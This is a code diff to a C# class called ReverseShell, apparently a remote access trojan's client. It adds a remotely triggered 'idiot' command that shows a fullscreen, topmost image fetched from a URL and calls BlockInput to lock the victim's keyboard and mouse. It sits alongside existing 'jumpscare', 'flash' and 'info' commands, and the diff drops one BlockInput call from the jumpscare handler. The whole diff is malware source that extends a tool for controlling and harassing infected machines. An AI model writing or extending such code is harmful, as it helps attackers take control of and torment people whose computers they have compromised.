@@ -179,6 +179,45 @@ class ReverseShell
         Application.Run(form);
     }
 
+        static void ShowIdiot()
+    {
+        string imageUrl = ""; //change this to ur RAW img
+
+        var form = new Form
+        {
+            WindowState = FormWindowState.Maximized,
+            FormBorderStyle = FormBorderStyle.None,
+            TopMost = true,
+            BackgroundImageLayout = ImageLayout.Stretch
+        };
+
+        try
+        {
+            form.BackgroundImage = GetImageFromUrl(imageUrl);
+        }
+        catch (Exception)
+        {
+        }
+
+        form.Shown += (s, e) =>
+        {
+            try
+            {
+                BlockInput(true);
+                Task.Delay(10000).ContinueWith(_ =>
+                {
+                    form.Invoke(new Action(() => form.Close()));
+                });
+            }
+            finally
+            {
+                BlockInput(false); 
+            }
+        };
+
+        Application.Run(form);
+    }
+
     static void ShowJumpscare()
     {
         string imageUrl = "https://cdn.polarisbot.com/jumpscare.jpg"; //change this to your RAW jpg
@@ -337,11 +376,14 @@ class ReverseShell
                     {
                         Task.Run(() => ShowFlash());
                     }
+                    if (command.ToLower() == "idiot")
+                    {
+                        Task.Run(() => ShowIdiot());
+                    }
 
                     if (command.ToLower() == "jumpscare")
                     {
                         Task.Run(() => ShowJumpscare());
-                        BlockInput(true);
                     }
 
                     if (command.ToLower() == "info")
